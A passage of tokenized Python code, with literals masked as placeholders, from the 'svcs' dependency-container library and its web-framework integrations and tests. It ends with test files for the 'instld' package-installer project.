request : Request , * svc_types : type ) -> object : <EOL> return svcs_from ( request ) . get ( * svc_types ) <EOL> </s>
<s> from __future__ import annotations <EOL> class ServiceNotFoundError ( Exception ) : <EOL> </s>
<s> import asyncio <EOL> from contextlib import asynccontextmanager <EOL> import pytest <EOL> import svcs <EOL> from tests . fake_factories import async_bool_cm_factory , async_int_factory <EOL> from tests . helpers import CloseMe <EOL> try : <EOL> from starlette . applications import Starlette <EOL> from starlette . middleware import Middleware <EOL> from starlette . responses import JSONResponse <EOL> from starlette . routing import Route <EOL> from starlette . testclient import TestClient <EOL> except ImportError : <EOL> pytest . skip ( "<STR_LIT>" , allow_module_level = True ) <EOL> @ pytest . mark . asyncio ( ) <EOL> @ pytest . mark . parametrize ( "<STR_LIT>" , [ True , False ] ) <EOL> @ pytest . mark . parametrize ( "<STR_LIT>" , [ True , False ] ) <EOL> async def test_integration ( yield_something , cm ) : <EOL> close_me_registry = CloseMe ( ) <EOL> close_me_container = CloseMe ( ) <EOL> async def factory ( ) : <EOL> await asyncio . sleep ( <NUM_LIT> ) <EOL> yield <NUM_LIT> <EOL> await asyncio . sleep ( <NUM_LIT> ) <EOL> await close_me_container . aclose ( ) <EOL> async def close_registry ( ) : <EOL> await close_me_registry . aclose ( ) <EOL> if yield_something : <EOL> async def lifespan ( app : Starlette , registry : svcs . Registry ) : <EOL> registry . register_factory ( <EOL> int , factory , on_registry_close = close_registry <EOL> ) <EOL> yield { "<STR_LIT>" : "<STR_LIT>" } <EOL> else : <EOL> async def lifespan ( app : Starlette , registry : svcs . Registry ) : <EOL> registry . register_factory ( <EOL> int , factory , on_registry_close = close_registry <EOL> ) <EOL> yield <EOL> if cm : <EOL> lifespan = asynccontextmanager ( lifespan ) <EOL> async def view ( request ) : <EOL> val = await svcs . starlette . aget ( request , int ) <EOL> assert ( <EOL> val <EOL> == await svcs . starlette . aget_abstract ( request , int ) <EOL> == await svcs . starlette . svcs_from ( request ) . aget ( int ) <EOL> ) <EOL> return JSONResponse ( { "<STR_LIT>" : val } ) <EOL> app = Starlette ( <EOL> lifespan = svcs . starlette . lifespan ( lifespan ) , <EOL> middleware = [ Middleware ( svcs . starlette . SVCSMiddleware ) ] , <EOL> routes = [ Route ( "<STR_LIT>" , view ) ] , <EOL> ) <EOL> with TestClient ( app ) as client : <EOL> assert { "<STR_LIT>" : <NUM_LIT> } == client . get ( "<STR_LIT>" ) . json ( ) <EOL> assert close_me_container . is_aclosed <EOL> assert close_me_registry . is_aclosed <EOL> async def healthy ( request ) : <EOL> ok = [ ] <EOL> failing = [ ] <EOL> code = <NUM_LIT> <EOL> for svc in svcs . starlette . get_pings ( request ) : <EOL> try : <EOL> await svc . aping ( ) <EOL> ok . append ( svc . name ) <EOL> except Exception as e : <EOL> failing . append ( { svc . name : repr ( e ) } ) <EOL> code = <NUM_LIT> <EOL> return JSONResponse ( <EOL> content = { "<STR_LIT>" : ok , "<STR_LIT>" : failing } , status_code = code <EOL> ) <EOL> @ pytest . mark . asyncio ( ) <EOL> async def test_get_pings ( registry , container ) : <EOL> async def aping ( _ ) : ... <EOL> async def aboom ( _ ) : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> @ svcs . starlette . lifespan <EOL> async def lifespan ( app : Starlette , registry : svcs . Registry ) : <EOL> registry . register_factory ( int , async_int_factory , ping = aping ) <EOL> registry . register_factory ( bool , async_bool_cm_factory , ping = aboom ) <EOL> yield { "<STR_LIT>" : "<STR_LIT>" } <EOL> app = Starlette ( <EOL> lifespan = lifespan , <EOL> middleware = [ Middleware ( svcs . starlette . SVCSMiddleware ) ] , <EOL> routes = [ Route ( "<STR_LIT>" , healthy ) ] , <EOL> ) <EOL> with TestClient ( app ) as client : <EOL> assert { <EOL> "<STR_LIT>" : [ <EOL> { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ] , <EOL> "<STR_LIT>" : [ "<STR_LIT>" ] , <EOL> } == client . get ( "<STR_LIT>" ) . json ( ) <EOL> </s>
<s> import dataclasses <EOL> from typing import Protocol , runtime_checkable <EOL> @ runtime_checkable <EOL> class Interface ( Protocol ) : <EOL> pass <EOL> @ dataclasses . dataclass <EOL> class Service : <EOL> pass <EOL> @ dataclasses . dataclass <EOL> class AnotherService : <EOL> pass <EOL> @ dataclasses . dataclass <EOL> class YetAnotherService : <EOL> pass <EOL> </s>
<s> from __future__ import annotations <EOL> import contextlib <EOL> import inspect <EOL> import sys <EOL> from typing import AsyncGenerator , Callable <EOL> import attrs <EOL> from fastapi import Depends , FastAPI , Request <EOL> import svcs <EOL> from svcs . _core import _KEY_REGISTRY <EOL> if sys . version_info < ( <NUM_LIT> , <NUM_LIT> ) : <EOL> from typing_extensions import Annotated <EOL> else : <EOL> from typing import Annotated <EOL> @ attrs . define <EOL> class lifespan : <EOL> _lifespan : ( <EOL> Callable [ <EOL> [ FastAPI , svcs . Registry ] , <EOL> contextlib . AbstractAsyncContextManager [ dict [ str , object ] ] , <EOL> ] <EOL> | Callable [ <EOL> [ FastAPI , svcs . Registry ] , <EOL> contextlib . AbstractAsyncContextManager [ None ] , <EOL> ] <EOL> | Callable [ <EOL> [ FastAPI , svcs . Registry ] , AsyncGenerator [ dict [ str , object ] , None ] <EOL> ] <EOL> | Callable [ [ FastAPI , svcs . Registry ] , AsyncGenerator [ None , None ] ] <EOL> ) <EOL> _state : dict [ str , object ] = attrs . field ( factory = dict ) <EOL> registry : svcs . Registry = attrs . field ( factory = svcs . Registry ) <EOL> @ contextlib . asynccontextmanager <EOL> async def __call__ ( <EOL> self , app : FastAPI <EOL> ) -> AsyncGenerator [ dict [ str , object ] , None ] : <EOL> cm : Callable [ <EOL> [ FastAPI , svcs . Registry ] , contextlib . AbstractAsyncContextManager <EOL> ] <EOL> if inspect . isasyncgenfunction ( self . _lifespan ) : <EOL> cm = contextlib . asynccontextmanager ( self . _lifespan ) <EOL> else : <EOL> cm = self . _lifespan <EOL> async with self . registry , cm ( app , self . registry ) as state : <EOL> self . _state = state or { } <EOL> self . _state [ _KEY_REGISTRY ] = self . registry <EOL> yield self . _state <EOL> async def container ( request : Request ) -> AsyncGenerator [ svcs . Container , None ] : <EOL> async with svcs . Container ( getattr ( request . state , _KEY_REGISTRY ) ) as cont : <EOL> yield cont <EOL> DepContainer = Annotated [ svcs . Container , Depends ( container ) ] <EOL> </s>
<s> from typing import Generator <EOL> import flask <EOL> import svcs <EOL> def factory_with_cleanup ( ) -> Generator [ int , None , None ] : <EOL> yield <NUM_LIT> <EOL> reg = svcs . Registry ( ) <EOL> app = flask . Flask ( "<STR_LIT>" ) <EOL> app = svcs . flask . init_app ( app , registry = reg ) <EOL> app = svcs . flask . init_app ( app ) <EOL> reg = svcs . flask . get_registry ( app ) <EOL> svcs . flask . register_value ( app , int , <NUM_LIT> ) <EOL> svcs . flask . register_value ( app , int , <NUM_LIT> , ping = lambda : None ) <EOL> svcs . flask . register_factory ( app , str , str ) <EOL> svcs . flask . register_factory ( app , int , factory_with_cleanup ) <EOL> svcs . flask . register_value ( app , str , str , ping = lambda : None ) <EOL> o1 : object = svcs . flask . get ( object ) <EOL> a : int <EOL> b : str <EOL> c : bool <EOL> d : tuple <EOL> e : object <EOL> f : float <EOL> g : list <EOL> h : dict <EOL> i : set <EOL> j : bytes <EOL> a , b , c , d , e , f , g , h , i , j = svcs . flask . get ( <EOL> int , str , bool , tuple , object , float , list , dict , set , bytes <EOL> ) <EOL> svcs . flask . close_registry ( app ) <EOL> con : svcs . Container = svcs . flask . svcs_from ( ) <EOL> con = svcs . flask . svcs_from ( flask . g ) <EOL> class CustomApp ( flask . Flask ) : <EOL> pass <EOL> app = svcs . flask . init_app ( CustomApp ( "<STR_LIT>" ) ) <EOL> reg = svcs . flask . get_registry ( CustomApp ( "<STR_LIT>" ) ) <EOL> local_p : svcs . Container = svcs . flask . container <EOL> local_r : svcs . Registry = svcs . flask . registry <EOL> </s>
<s> from __future__ import annotations <EOL> import json <EOL> from pyramid . request import Request <EOL> from pyramid . response import Response <EOL> from pyramid . view import view_config <EOL> import svcs <EOL> @ view_config ( route_name = "<STR_LIT>" ) <EOL> def healthy_view ( request : Request ) -> Response : <EOL> ok : list [ str ] = [ ] <EOL> failing : list [ dict [ str , str ] ] = [ ] <EOL> status = <NUM_LIT> <EOL> for svc in svcs . pyramid . get_pings ( request ) : <EOL> try : <EOL> svc . ping ( ) <EOL> ok . append ( svc . name ) <EOL> except Exception as e : <EOL> failing . append ( { svc . name : repr ( e ) } ) <EOL> status = <NUM_LIT> <EOL> return Response ( <EOL> content_type = "<STR_LIT>" , <EOL> status = status , <EOL> body = json . dumps ( { "<STR_LIT>" : ok , "<STR_LIT>" : failing } ) . encode ( "<STR_LIT>" ) , <EOL> ) <EOL> </s>
<s> from __future__ import annotations <EOL> from starlette . requests import Request <EOL> from starlette . responses import JSONResponse <EOL> import svcs <EOL> async def healthy ( request : Request ) -> JSONResponse : <EOL> ok : list [ str ] = [ ] <EOL> failing : list [ dict [ str , str ] ] = [ ] <EOL> code = <NUM_LIT> <EOL> for svc in svcs . starlette . get_pings ( request ) : <EOL> try : <EOL> await svc . aping ( ) <EOL> ok . append ( svc . name ) <EOL> except Exception as e : <EOL> failing . append ( { svc . name : repr ( e ) } ) <EOL> code = <NUM_LIT> <EOL> return JSONResponse ( <EOL> content = { "<STR_LIT>" : ok , "<STR_LIT>" : failing } , status_code = code <EOL> ) <EOL> </s>
<s> from unittest . mock import Mock <EOL> import pytest <EOL> import svcs <EOL> from tests . fake_factories import int_factory <EOL> from tests . helpers import nop <EOL> from tests . ifaces import AnotherService , Service <EOL> try : <EOL> import httpx <EOL> from pyramid . config import Configurator <EOL> from pyramid . view import view_config <EOL> except ImportError : <EOL> pytest . skip ( "<STR_LIT>" , allow_module_level = True ) <EOL> @ pytest . fixture ( name = "<STR_LIT>" ) <EOL> def _config ( ) : <EOL> config = Configurator ( settings = { } ) <EOL> svcs . pyramid . init ( config ) <EOL> config . add_route ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> config . add_route ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> config . scan ( ) <EOL> return config <EOL> @ pytest . fixture ( name = "<STR_LIT>" ) <EOL> def _app ( config ) : <EOL> return config . make_wsgi_app ( ) <EOL> @ pytest . fixture ( name = "<STR_LIT>" ) <EOL> def _client ( app ) : <EOL> return httpx . Client ( app = app , base_url = "<STR_LIT>" ) <EOL> @ pytest . fixture ( name = "<STR_LIT>" , params = ( <NUM_LIT> , <NUM_LIT> ) ) <EOL> def _rh ( request , config , app ) : <EOL> return ( config , app ) [ request . param ] <EOL> def test_close_nop ( rh ) : <EOL> svcs . pyramid . close_registry ( Mock ( registry = { } ) ) <EOL> def test_close ( rh ) : <EOL> orc = Mock ( ) <EOL> svcs . pyramid . register_factory ( rh , int , int_factory , on_registry_close = orc ) <EOL> svcs . pyramid . close_registry ( rh ) <EOL> assert orc . called <EOL> @ view_config ( route_name = "<STR_LIT>" , renderer = "<STR_LIT>" ) <EOL> def tl_view ( request ) : <EOL> svc = svcs . pyramid . get ( request , Service ) <EOL> svcs . pyramid . get ( request , float ) <EOL> assert ( <EOL> svc <EOL> is svcs . pyramid . get ( request , Service ) <EOL> is svcs . pyramid . svcs_from ( request ) . get ( Service ) <EOL> is svcs . pyramid . get_abstract ( request , Service ) <EOL> ) <EOL> assert ( <EOL> request . registry [ "<STR_LIT>" ] <EOL> is svcs . pyramid . get_registry ( ) <EOL> is svcs . pyramid . get_registry ( request ) <EOL> ) <EOL> assert ( <EOL> request . svcs_container <EOL> is svcs . pyramid . svcs_from ( ) <EOL> is svcs . pyramid . svcs_from ( request ) <EOL> ) <EOL> return { "<STR_LIT>" : svc } <EOL> @ view_config ( route_name = "<STR_LIT>" , renderer = "<STR_LIT>" ) <EOL> def health_view ( request ) : <EOL> assert ( <EOL> svcs . pyramid . get_pings ( request ) <EOL> == svcs . pyramid . svcs_from ( request ) . get_pings ( ) <EOL> ) <EOL> return { "<STR_LIT>" : len ( svcs . pyramid . svcs_from ( request ) . get_pings ( ) ) } <EOL> class TestIntergration : <EOL> def test_get ( self , app , client , close_me ) : <EOL> def closing_factory ( ) : <EOL> yield <NUM_LIT> <EOL> close_me . close ( ) <EOL> svcs . pyramid . get_registry ( app ) . register_value ( Service , <NUM_LIT> ) <EOL> svcs . pyramid . register_value ( app , AnotherService , <NUM_LIT> ) <EOL> svcs . pyramid . register_factory ( app , float , closing_factory ) <EOL> assert { "<STR_LIT>" : <NUM_LIT> } == client . get ( "<STR_LIT>" ) . json ( ) <EOL> assert close_me . is_closed <EOL> def test_get_pings ( self , app , client ) : <EOL> svcs . pyramid . get_registry ( app ) . register_value ( Service , <NUM_LIT> , ping = nop ) <EOL> assert { "<STR_LIT>" : <NUM_LIT> } == client . get ( "<STR_LIT>" ) . json ( ) <EOL> </s>
<s> from __future__ import annotations <EOL> from contextlib import asynccontextmanager <EOL> from typing import AsyncGenerator , Generator , Protocol <EOL> from starlette . applications import Starlette <EOL> from starlette . middleware import Middleware <EOL> from starlette . requests import Request <EOL> import svcs <EOL> def factory_with_cleanup ( ) -> Generator [ int , None , None ] : <EOL> yield <NUM_LIT> <EOL> @ svcs . starlette . lifespan <EOL> async def lifespan ( <EOL> app : Starlette , registry : svcs . Registry <EOL> ) -> AsyncGenerator [ dict [ str , object ] , None ] : <EOL> yield { } <EOL> reg : svcs . Registry = lifespan . registry <EOL> @ svcs . starlette . lifespan <EOL> async def lifespan2 ( <EOL> app : Starlette , registry : svcs . Registry <EOL> ) -> AsyncGenerator [ None , None ] : <EOL> yield <EOL> @ svcs . starlette . lifespan <EOL> @ asynccontextmanager <EOL> async def lifespan3 ( <EOL> app : Starlette , registry : svcs . Registry <EOL> ) -> AsyncGenerator [ dict [ str , object ] , None ] : <EOL> yield { } <EOL> @ svcs . starlette . lifespan <EOL> @ asynccontextmanager <EOL> async def lifespan4 ( <EOL> app : Starlette , registry : svcs . Registry <EOL> ) -> AsyncGenerator [ None , None ] : <EOL> yield <EOL> reg = svcs . Registry ( ) <EOL> app = Starlette ( <EOL> lifespan = lifespan , middleware = [ Middleware ( svcs . starlette . SVCSMiddleware ) ] <EOL> ) <EOL> a : int <EOL> b : str <EOL> c : bool <EOL> d : tuple <EOL> e : object <EOL> f : float <EOL> g : list <EOL> h : dict <EOL> i : set <EOL> j : bytes <EOL> request = Request ( { } ) <EOL> class P ( Protocol ) : <EOL> def m ( self ) -> None : ... <EOL> async def func ( ) -> None : <EOL> a , b , c , d , e , f , g , h , i , j = await svcs . starlette . aget ( <EOL> request , int , str , bool , tuple , object , float , list , dict , set , bytes <EOL> ) <EOL> p : P = await svcs . starlette . aget_abstract ( request , P ) <EOL> con : svcs . Container = svcs . starlette . svcs_from ( request ) <EOL> </s>
<s> import gc <EOL> from unittest . mock import Mock <EOL> import pytest <EOL> import svcs <EOL> from . fake_factories import ( <EOL> async_bool_cm_factory , <EOL> async_str_gen_factory , <EOL> bool_cm_factory , <EOL> str_gen_factory , <EOL> ) <EOL> from . ifaces import AnotherService , Service , YetAnotherService <EOL> class TestContainer : <EOL> def test_get_pings_empty ( self , container ) : <EOL> assert [ ] == container . get_pings ( ) <EOL> @ pytest . mark . asyncio ( ) <EOL> async def test_repr ( self , registry , container ) : <EOL> registry . register_factory ( Service , str_gen_factory ) <EOL> registry . register_factory ( bool , bool_cm_factory ) <EOL> registry . register_factory ( AnotherService , async_str_gen_factory ) <EOL> registry . register_factory ( YetAnotherService , async_bool_cm_factory ) <EOL> container . get ( Service ) <EOL> container . get ( bool ) <EOL> await container . aget ( AnotherService ) <EOL> await container . aget ( YetAnotherService ) <EOL> assert "<STR_LIT>" == repr ( container ) <EOL> await container . aclose ( ) <EOL> def test_contains ( self , container ) : <EOL> container . registry . register_value ( int , <NUM_LIT> ) <EOL> assert int not in container <EOL> container . get ( int ) <EOL> assert int in container <EOL> def test_context_manager ( self , container , close_me ) : <EOL> def factory ( ) : <EOL> yield <NUM_LIT> <EOL> close_me . close ( ) <EOL> container . registry . register_factory ( int , factory ) <EOL> with container : <EOL> assert <NUM_LIT> == container . get ( int ) <EOL> assert close_me . is_closed <EOL> @ pytest . mark . asyncio ( ) <EOL> async def test_async_context_manager ( self , container , close_me ) : <EOL> async def factory ( ) : <EOL> yield <NUM_LIT> <EOL> await close_me . aclose ( ) <EOL> container . registry . register_factory ( int , factory ) <EOL> async with container : <EOL> assert <NUM_LIT> == await container . aget ( int ) <EOL> assert close_me . is_aclosed <EOL> def test_gc_warning ( self , recwarn , registry ) : <EOL> def scope ( ) : <EOL> container = svcs . Container ( registry ) <EOL> registry . register_factory ( str , str_gen_factory ) <EOL> container . get ( str ) <EOL> scope ( ) <EOL> gc . collect ( ) <EOL> assert ( <EOL> "<STR_LIT>" , <EOL> ) == recwarn . list [ <NUM_LIT> ] . message . args <EOL> class TestServicePing : <EOL> def test_ping ( self , registry , container , close_me ) : <EOL> def factory ( ) : <EOL> yield Service ( ) <EOL> close_me . close ( ) <EOL> ping = Mock ( spec_set = [ "<STR_LIT>" ] ) <EOL> registry . register_factory ( Service , factory , ping = ping ) <EOL> ( svc_ping , ) = container . get_pings ( ) <EOL> svc_ping . ping ( ) <EOL> ping . assert_called_once ( ) <EOL> assert not close_me . is_closed <EOL> container . close ( ) <EOL> assert close_me . is_closed <EOL> assert not container . _instantiated <EOL> assert not container . _on_close <EOL> </s>
<s> import sys <EOL> import logging <EOL> from instld . module . context_manager import pip_context <EOL> from instld . module . runner import run_python <EOL> from instld . module . empty_logger import EmptyLogger <EOL> from instld . common_utils . convert_options import convert_options <EOL> class ProxyModule ( sys . modules [ __name__ ] . __class__ ) : <EOL> def __call__ ( self , * packages_names , logger = logging , runner = run_python , catch_output = False , where = None , ** options ) : <EOL> if logger is None : <EOL> logger = EmptyLogger ( ) <EOL> options = convert_options ( options ) <EOL> return pip_context ( packages_names , options , logger , runner , catch_output , where ) <EOL> </s>
<s> from instld . errors import InstallingPackageError <EOL> from instld . cli . parsing_comments . get_comment_string import get_comment_string_by_frame <EOL> def get_options_from_comments ( comment_string ) : <EOL> result = { } <EOL> if comment_string is not None : <EOL> options = ( x . strip ( ) for x in comment_string . split ( '<STR_LIT>' ) ) <EOL> options = ( x for x in options if x ) <EOL> for option in options : <EOL> splitted_option = [ x for x in option . split ( ) if x ] <EOL> if len ( splitted_option ) != <NUM_LIT> : <EOL> raise InstallingPackageError ( '<STR_LIT>' ) <EOL> option_name = splitted_option [ <NUM_LIT> ] . strip ( ) . lower ( ) <EOL> option_value = splitted_option [ <NUM_LIT> ] . strip ( ) . lower ( ) <EOL> result [ option_name ] = option_value <EOL> result . pop ( '<STR_LIT>' , None ) <EOL> result . pop ( '<STR_LIT>' , None ) <EOL> return result <EOL> def get_options_from_comments_by_frame ( frame ) : <EOL> comment_string = get_comment_string_by_frame ( frame ) <EOL> return get_options_from_comments ( comment_string ) <EOL> </s>
<s> import os <EOL> import sys <EOL> import json <EOL> import subprocess <EOL> import shutil <EOL> import pytest <EOL> @ pytest . mark . timeout ( <NUM_LIT> ) <EOL> def test_cli_where ( main_runner ) : <EOL> strings = [ <EOL> rf'<STR_LIT>' , <EOL> rf'<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> ] <EOL> script = os . path . join ( '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ) <EOL> with open ( script , '<STR_LIT>' ) as file : <EOL> file . write ( '<STR_LIT>' . join ( strings ) ) <EOL> for runner in ( main_runner , subprocess . run ) : <EOL> result = runner ( [ '<STR_LIT>' , script ] , stdout = subprocess . PIPE , stderr = subprocess . PIPE , bufsize = <NUM_LIT> ) <EOL> result . check_returncode ( ) <EOL> base_libs_paths = { <EOL> os . path . join ( '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ) : '<STR_LIT>' , <EOL> os . path . join ( '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ) : '<STR_LIT>' , <EOL> } <EOL> for path , library_name in base_libs_paths . items ( ) : <EOL> full_path_to_the_lib = os . path . join ( path , '<STR_LIT>' ) <EOL> if sys . platform . lower ( ) not in ( '<STR_LIT>' , ) : <EOL> full_path_to_the_lib = os . path . join ( full_path_to_the_lib , os . path . basename ( os . listdir ( path = full_path_to_the_lib ) [ <NUM_LIT> ] ) , '<STR_LIT>' ) <EOL> full_path_to_the_lib = os . path . join ( full_path_to_the_lib , library_name ) <EOL> assert os . path . isdir ( full_path_to_the_lib ) <EOL> shutil . rmtree ( path ) <EOL> os . remove ( script ) <EOL> def test_run_command_with_arguments ( main_runner ) : <EOL> strings = [ <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> ] <EOL> script = os . path . join ( '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ) <EOL> with open ( script , '<STR_LIT>' ) as file : <EOL> file . write ( os . linesep . join ( strings ) ) <EOL> extra_arguments_options = ( <EOL> [ ] , <EOL> [ '<STR_LIT>' ] , <EOL> [ '<STR_LIT>' , '<STR_LIT>' ] , <EOL> [ '<STR_LIT>' , '<STR_LIT>' ] , <EOL> ) <EOL> for runner in ( main_runner , subprocess . run ) : <EOL> for extra_arguments in extra_arguments_options : <EOL> expected_arguments_without_command = [ script ] + extra_arguments <EOL> result = runner ( [ '<STR_LIT>' , * expected_arguments_without_command ] , stdout = subprocess . PIPE , stderr = subprocess . PIPE , bufsize = <NUM_LIT> ) <EOL> result . check_returncode ( ) <EOL> assert result . stderr . decode ( '<STR_LIT>' ) == '<STR_LIT>' <EOL> arguments_from_file = json . loads ( result . stdout . decode ( '<STR_LIT>' ) ) <EOL> arguments_from_file_without_command = arguments_from_file [ <NUM_LIT> : ] <EOL> assert arguments_from_file_without_command == expected_arguments_without_command <EOL> os . remove ( script ) <EOL> def test_exceptions_are_similar_with_just_python_command ( main_runner ) : <EOL> errors = [ <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> ] <EOL> for runner in ( subprocess . run , main_runner ) : <EOL> for error in errors : <EOL> script = os . path . join ( '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ) <EOL> with open ( script , '<STR_LIT>' ) as file : <EOL> file . write ( f'<STR_LIT>' ) <EOL> result_1 = runner ( [ '<STR_LIT>' , os . path . abspath ( script ) ] , stdout = subprocess . PIPE , stderr = subprocess . PIPE , bufsize = <NUM_LIT> ) <EOL> result_2 = subprocess . run ( [ '<STR_LIT>' , os . path . abspath ( script ) ] , stdout = subprocess . PIPE , stderr = subprocess . PIPE , bufsize = <NUM_LIT> ) <EOL> assert result_1 . returncode == result_2 . returncode <EOL> assert result_1 . stdout == result_2 . stdout <EOL> assert result_1 . stderr == result_2 . stderr <EOL> os . remove ( script ) <EOL> def test_exceptions_are_similar_with_just_python_command_2 ( ) : <EOL> errors = [ <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> ] <EOL> for error in errors : <EOL> script = os . path . join ( '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ) <EOL> with open ( script , '<STR_LIT>' ) as file : <EOL> file . write ( f'<STR_LIT>' ) <EOL> result_1 = subprocess . run ( [ '<STR_LIT>' , os . path . abspath ( script ) ] , stdout = subprocess . PIPE , stderr = subprocess . PIPE , bufsize = <NUM_LIT> ) <EOL> result_2 = subprocess . run ( [ '<STR_LIT>' , os . path . abspath ( script ) ] , stdout = subprocess . PIPE , stderr = subprocess . PIPE , bufsize = <NUM_LIT> ) <EOL> assert result_1 . returncode == result_2 . returncode <EOL> assert result_1 . stdout == result_2 . stdout <EOL> assert result_1 . stderr == result_2 . stderr <EOL> os . remove ( script ) <EOL> @ pytest . mark . skip ( reason = "<STR_LIT>" ) <EOL> def test_install_package_from_another_repository ( main_runner ) : <EOL> strings = [ <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> ] <EOL> script = os . path . join ( '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ) <EOL> with open ( script , '<STR_LIT>' ) as file : <EOL> file . write ( '<STR_LIT>' . join ( strings ) ) <EOL> for runner in ( subprocess . run , main_runner ) : <EOL> result = runner ( [ '<STR_LIT>' , script ] , stdout = subprocess . PIPE , stderr = subprocess . PIPE , bufsize = <NUM_LIT> , universal_newlines = True ) <EOL> result . check_returncode ( ) <EOL> assert result . stdout == '<STR_LIT>' <EOL> os . remove ( script ) <EOL> def test_install_package_from_another_repository_only_command ( ) : <EOL> strings = [ <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> ] <EOL> script = os . path . join ( '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ) <EOL> with open ( script , '<STR_LIT>' ) as file : <EOL> file . write ( '<STR_LIT>' . join ( strings ) ) <EOL> for runner in ( subprocess . run , ) : <EOL> result = runner ( [ '<STR_LIT>' , script ] , stdout = subprocess . PIPE , stderr = subprocess . PIPE , bufsize = <NUM_LIT> , universal_newlines = True ) <EOL> result . check_returncode ( ) <EOL> assert result . stdout == '<STR_LIT>' <EOL> os . remove ( script ) <EOL> def test_run_script_and_check_the___name__ ( ) : <EOL> strings = [ <EOL> '<STR_LIT>' , <EOL> ] <EOL> script = os . path . join ( '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ) <EOL> with open ( script , '<STR_LIT>' ) as file : <EOL> file . write ( '<STR_LIT>' . join ( strings ) ) <EOL> for runner in ( subprocess . run , ) : <EOL> result = runner ( [ '<STR_LIT>' , script ] , stdout = subprocess . PIPE , stderr = subprocess . PIPE , bufsize = <NUM_LIT> , universal_newlines = True ) <EOL> result . check_returncode ( ) <EOL> assert result . stdout == '<STR_LIT>' <EOL> os . remove ( script ) <EOL> </s>
<s> import sys <EOL> import importlib <EOL> import copy <EOL> from io import StringIO <EOL> from contextlib import redirect_stdout <EOL> from tempfile import TemporaryDirectory <EOL> import pytest <EOL> import instld <EOL> def test_polog_install_and_import ( ) : <EOL> with instld ( '<STR_LIT>' ) : <EOL> import polog <EOL> importlib . reload ( polog ) <EOL> def test_polog_install_and_import_with_logger_none ( ) : <EOL> with instld ( '<STR_LIT>' , logger = None ) : <EOL> import polog <EOL> importlib . reload ( polog ) <EOL> def test_polog_install_two_and_import ( ) : <EOL> with instld ( '<STR_LIT>' , '<STR_LIT>' ) : <EOL> import polog <EOL> import astrologic <EOL> importlib . reload ( polog ) <EOL> importlib . reload ( astrologic ) <EOL> def test_polog_install_two_contexts_and_import ( ) : <EOL> with instld ( '<STR_LIT>' ) : <EOL> with instld ( '<STR_LIT>' ) : <EOL> import polog <EOL> import astrologic <EOL> importlib . reload ( polog ) <EOL> importlib . reload ( astrologic ) <EOL> def test_deleting_contexts ( ) : <EOL> with instld ( '<STR_LIT>' ) : <EOL> with instld ( '<STR_LIT>' ) : <EOL> pass <EOL> with pytest . raises ( ModuleNotFoundError ) : <EOL> import polog <EOL> importlib . reload ( polog ) <EOL> def test_sys_path_lenth ( ) : <EOL> number_before = len ( sys . path ) <EOL> sys_path_copy = copy . copy ( sys . path ) <EOL> with instld ( '<STR_LIT>' ) : <EOL> assert len ( sys . path ) == number_before + <NUM_LIT> <EOL> assert sys . path [ <NUM_LIT> : ] == sys_path_copy <EOL> assert len ( sys . path ) == number_before <EOL> def test_fazy_install_and_autoimport ( ) : <EOL> with instld ( '<STR_LIT>' ) as package : <EOL> f = package . import_here ( '<STR_LIT>' ) <EOL> assert f ( '<STR_LIT>' ) == '<STR_LIT>' <EOL> def test_super_project ( ) : <EOL> with instld ( '<STR_LIT>' , index_url = '<STR_LIT>' ) as package : <EOL> module = package . import_here ( '<STR_LIT>' ) <EOL> assert module . version == '<STR_LIT>' <EOL> assert module . function ( <NUM_LIT> , <NUM_LIT> ) == <NUM_LIT> <EOL> with instld ( '<STR_LIT>' , index_url = '<STR_LIT>' ) as package : <EOL> module = package . import_here ( '<STR_LIT>' ) <EOL> assert module . version == '<STR_LIT>' <EOL> assert module . function ( <NUM_LIT> , <NUM_LIT> ) == <NUM_LIT> <EOL> with instld ( '<STR_LIT>' , index_url = '<STR_LIT>' ) as package : <EOL> module = package . import_here ( '<STR_LIT>' ) <EOL> assert module . version == '<STR_LIT>' <EOL> assert module . function ( <NUM_LIT> , <NUM_LIT> ) == <NUM_LIT> <EOL> with instld ( '<STR_LIT>' , index_url = '<STR_LIT>' ) as package : <EOL> module = package . import_here ( '<STR_LIT>' ) <EOL> assert module . version == '<STR_LIT>' <EOL> assert module . function ( <NUM_LIT> , <NUM_LIT> ) == <NUM_LIT> <EOL> def test_super_project_nested ( ) : <EOL> with instld ( '<STR_LIT>' , index_url = '<STR_LIT>' ) as package_1 : <EOL> with instld ( '<STR_LIT>' , index_url = '<STR_LIT>' ) as package_2 : <EOL> with instld ( '<STR_LIT>' , index_url = '<STR_LIT>' ) as package_3 : <EOL> module_1 = package_1 . import_here ( '<STR_LIT>' ) <EOL> module_2 = package_2 . import_here ( '<STR_LIT>' ) <EOL> module_3 = package_3 . import_here ( '<STR_LIT>' ) <EOL> assert module_1 . version == '<STR_LIT>' <EOL> assert module_2 . version == '<STR_LIT>' <EOL> assert module_3 . version == '<STR_LIT>' <EOL> def test_catch_output_default ( ) : <EOL> with redirect_stdout ( StringIO ( ) ) as context : <EOL> with instld ( '<STR_LIT>' , index_url = '<STR_LIT>' ) : <EOL> pass <EOL> assert len ( context . getvalue ( ) ) > <NUM_LIT> <EOL> def test_catch_output_false ( ) : <EOL> with redirect_stdout ( StringIO ( ) ) as context : <EOL> with instld ( '<STR_LIT>' , index_url = 